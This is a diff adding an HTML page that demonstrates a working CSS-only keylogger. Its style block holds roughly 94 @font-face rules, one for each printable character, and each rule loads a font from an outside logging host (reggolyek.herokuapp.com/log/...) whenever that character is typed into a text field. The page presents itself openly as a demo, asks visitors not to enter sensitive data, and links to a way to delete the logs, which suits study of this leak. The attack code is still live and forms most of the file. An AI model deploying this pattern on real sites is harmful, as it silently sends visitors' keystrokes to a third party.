@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+  <meta charset="UTF-8">
+  <title>CSS Keylogger » HTML Laboratory » attac.us</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%21"); unicode-range: U+21; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%22"); unicode-range: U+22; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%23"); unicode-range: U+23; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%24"); unicode-range: U+24; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%25"); unicode-range: U+25; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%26"); unicode-range: U+26; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%27"); unicode-range: U+27; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%28"); unicode-range: U+28; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%29"); unicode-range: U+29; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%2a"); unicode-range: U+2A; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%2b"); unicode-range: U+2B; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%2c"); unicode-range: U+2C; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%2d"); unicode-range: U+2D; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%2e"); unicode-range: U+2E; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%2f"); unicode-range: U+2F; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%30"); unicode-range: U+30; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%31"); unicode-range: U+31; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%32"); unicode-range: U+32; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%33"); unicode-range: U+33; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%34"); unicode-range: U+34; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%35"); unicode-range: U+35; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%36"); unicode-range: U+36; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%37"); unicode-range: U+37; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%38"); unicode-range: U+38; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%39"); unicode-range: U+39; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%3a"); unicode-range: U+3A; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%3b"); unicode-range: U+3B; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%3c"); unicode-range: U+3C; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%3d"); unicode-range: U+3D; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%3e"); unicode-range: U+3E; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%3f"); unicode-range: U+3F; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%40"); unicode-range: U+40; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%41"); unicode-range: U+41; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%42"); unicode-range: U+42; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%43"); unicode-range: U+43; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%44"); unicode-range: U+44; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%45"); unicode-range: U+45; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%46"); unicode-range: U+46; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%47"); unicode-range: U+47; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%48"); unicode-range: U+48; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%49"); unicode-range: U+49; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%4a"); unicode-range: U+4A; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%4b"); unicode-range: U+4B; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%4c"); unicode-range: U+4C; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%4d"); unicode-range: U+4D; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%4e"); unicode-range: U+4E; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%4f"); unicode-range: U+4F; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%50"); unicode-range: U+50; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%51"); unicode-range: U+51; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%52"); unicode-range: U+52; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%53"); unicode-range: U+53; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%54"); unicode-range: U+54; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%55"); unicode-range: U+55; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%56"); unicode-range: U+56; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%57"); unicode-range: U+57; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%58"); unicode-range: U+58; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%59"); unicode-range: U+59; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%5a"); unicode-range: U+5A; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%5b"); unicode-range: U+5B; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%5c"); unicode-range: U+5C; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%5d"); unicode-range: U+5D; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%5e"); unicode-range: U+5E; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%5f"); unicode-range: U+5F; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%60"); unicode-range: U+60; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%61"); unicode-range: U+61; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%62"); unicode-range: U+62; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%63"); unicode-range: U+63; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%64"); unicode-range: U+64; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%65"); unicode-range: U+65; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%66"); unicode-range: U+66; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%67"); unicode-range: U+67; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%68"); unicode-range: U+68; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%69"); unicode-range: U+69; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%6a"); unicode-range: U+6A; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%6b"); unicode-range: U+6B; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%6c"); unicode-range: U+6C; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%6d"); unicode-range: U+6D; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%6e"); unicode-range: U+6E; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%6f"); unicode-range: U+6F; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%70"); unicode-range: U+70; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%71"); unicode-range: U+71; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%72"); unicode-range: U+72; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%73"); unicode-range: U+73; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%74"); unicode-range: U+74; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%75"); unicode-range: U+75; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%76"); unicode-range: U+76; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%77"); unicode-range: U+77; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%78"); unicode-range: U+78; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%79"); unicode-range: U+79; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%7a"); unicode-range: U+7A; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%7b"); unicode-range: U+7B; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%7c"); unicode-range: U+7C; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%7d"); unicode-range: U+7D; }
+    @font-face { font-family: -spy; src: url("https://reggolyek.herokuapp.com/log/%7e"); unicode-range: U+7E; }
+
+    input[type=text] {
+      font-family: -spy;
+    }
+
+    /********/
+
+    body,
+    input {
+      font: 700 20px/32px "Lucida Grande", "Lucida Sans Unicode", "Lucida Sans", Ubuntu, Tahoma, sans-serif;
+    }
+
+    html {
+      background: url(../images/purple-tile.gif) fixed #9B1A46;
+    }
+
+    body {
+      background: url(../images/tile.gif) #9ac4c9;
+
+      border-width: 3vw 1vw;
+      border-color: #f5c71a;
+      border-style: solid;
+    }
+
+
+    @media (min-width: 600px) {
+      body,
+      input {
+        font-size: 26px;
+        line-height: 40px;
+      }
+    }
+
+    body {
+      margin: auto;
+      padding: 0 2vw;
+
+      max-width: 600px;
+    }
+
+    h1,
+    h2 {
+      line-height: 1.2;
+
+      background: #CD3423;
+      color: white;
+    }
+
+    h1,
+    h2,
+    code {
+      font-family: "Lucida Console", Monaco, Consolas, "Fira Mono", "DejaVu Sans Mono", monospace;
+    }
+
+    h1 {
+      color: white;
+
+      margin: 0;
+      padding: 0.25em 0;
+
+      width: calc(100% + 4vw);
+
+      position: relative;
+      right: 2vw;
+
+      text-align: center;
+    }
+
+    p {
+      margin-top: 0;
+    }
+
+    a:link,
+    a:visited {
+      color: white;
+      background: #680068;
+
+      padding: 0.0625em 0.125em;
+      line-height: 0;
+    }
+
+    input[type=text] {
+      display: block;
+      width: 100%;
+
+      margin: 0.5em 0;
+    }
+
+    h2 {
+      padding: 0.25em;
+    }
+
+    form { margin: 2em; }
+
+    figure { text-align: center; margin: 2em auto; width: 75%; max-width: 400px; }
+    figure img { width: 100%; height: auto; }
+
+    ul {
+      line-height: 2;
+    }
+
+    nav {
+      margin-top: 2em;
+    }
+
+  </style>
+</head>
+<body>
+
+<header>
+  <h1>CSS @font-face keylogger demo</h1>
+</header>
+
+<main>
+
+  <figure class="result">
+    <img src="https://reggolyek.herokuapp.com/spy.svg" alt="The keylogger's guess on what you typed" width="300" height="220">
+  </figure>
+
+  <p>
+    This is another demo of a CSS-based keylogger based on <a href="https://news.ycombinator.com/item?id=16427394">this comment</a>.
+    There is no JavaScript on this page,
+    but it leaks user input through the <code>@font-face</code> CSS directive.
+  </p>
+
+  <section>
+    <h2>Try out the demo</h2>
+
+    <p>I “promise” not to share your information with third parties.</p>
+
+    <figure class="thanks">
+      <img alt="Please don’t enter sensitive information on my page thanks" src="../images/sensitive.svg" width="300" height="300">
+    </figure>
+
+    <form>
+      <label id="author-label" for="author">Who is your favorite author?</label>
+      <input id="author" aria-labelledby="author-label" type="text">
+      <input type="submit" value="Check the keylogger!">
+    </form>
+  </section>
+
+</main>
+
+<nav>
+  <ul>
+    <li><a href="https://reggolyek.herokuapp.com/clear">Delete your keylog entries</a></li>
+    <li><a href=".." rel="index">Return to index</a></li>
+  </ul>
+</nav>
+
+</body>
+</html>
